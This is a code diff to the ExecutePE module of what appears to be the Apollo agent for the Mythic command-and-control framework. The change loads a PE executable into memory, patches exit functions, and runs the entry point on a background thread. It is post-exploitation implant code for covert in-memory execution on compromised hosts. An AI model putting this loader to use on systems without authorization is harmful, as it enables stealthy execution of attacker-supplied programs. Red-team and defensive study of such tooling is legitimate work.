@@ -14,9 +14,8 @@ using ApolloInterop.Enums.ApolloEnums;
 using ApolloInterop.Constants;
 using ST = System.Threading.Tasks;
 using System.IO.Pipes;
-using ApolloInterop.Classes.IO;
-using System.IO;
 using ExecutePE.Helpers;
+using static ExecutePE.PERunner;
 
 namespace ExecutePE
 {
@@ -96,7 +95,62 @@ namespace ExecutePE
 
                 using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
                 {
-                    PERunner.RunPE(peMessage);
+                    //PERunner.RunPE(peMessage);
+                    // Set up API hooking for console functions
+                    using (ExitInterceptor interceptor = new ExitInterceptor())
+                    {
+                        // Apply the patches before loading and running the PE
+                        if (interceptor.ApplyExitFunctionPatches())
+                        {
+                            using (PERunner.MemoryPE memoryPE = new PERunner.MemoryPE(peMessage.Executable, peMessage.CommandLine))
+                            {
+                                // Create a wait handle to signal when execution is complete
+                                var executionCompletedEvent = new ManualResetEvent(false);
+
+                                // Execute the PE in a separate thread to avoid blocking the main thread
+                                //Console.WriteLine("\nExecuting PE file in a separate thread...");
+                                //Stopwatch sw = Stopwatch.StartNew();
+
+                                ThreadPool.QueueUserWorkItem(_ =>
+                                {
+                                    try
+                                    {
+                                        // You can either use Execute() or ExecuteInThread()
+                                        Console.WriteLine("[*] Calling PE entry point...");
+                                        int? return_code = memoryPE.ExecuteInThread(waitForExit: true);
+                                        Console.WriteLine($"\n[*] PE function returned with exit code: {return_code}");
+                                        //Thread.Sleep(5000);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        Console.WriteLine($"\nError during PE execution: {ex.Message}");
+                                    }
+                                    finally
+                                    {
+                                        // Signal completion regardless of outcome
+                                        executionCompletedEvent.Set();
+                                    }
+                                });
+
+                                // Wait for either completion or cancellation
+                               // Console.WriteLine("Waiting for PE execution to complete...");
+
+                                // Create an array of wait handles to wait for
+                                WaitHandle[] waitHandles = new WaitHandle[]
+                                {
+                                    executionCompletedEvent,         // PE execution completed
+                                };
+
+                                // Wait for any of the handles to be signaled
+                                int signalIndex = WaitHandle.WaitAny(waitHandles);
+                            }
+                            interceptor.RemoveExitFunctionPatches();
+                        }
+                        else
+                        {
+                            Console.WriteLine("Failed to apply exit function patches");
+                        }
+                    }
                 }
 
             }
@@ -105,7 +159,7 @@ namespace ExecutePE
                 // Handle any exceptions and try to send the contents back to Mythic
                 _senderQueue.Enqueue(Encoding.UTF8.GetBytes(exc.ToString()));
                 _senderEvent.Set();
-                return_code = exc.HResult;
+                //return_code = exc.HResult;
             }
             _cts.Cancel();
 
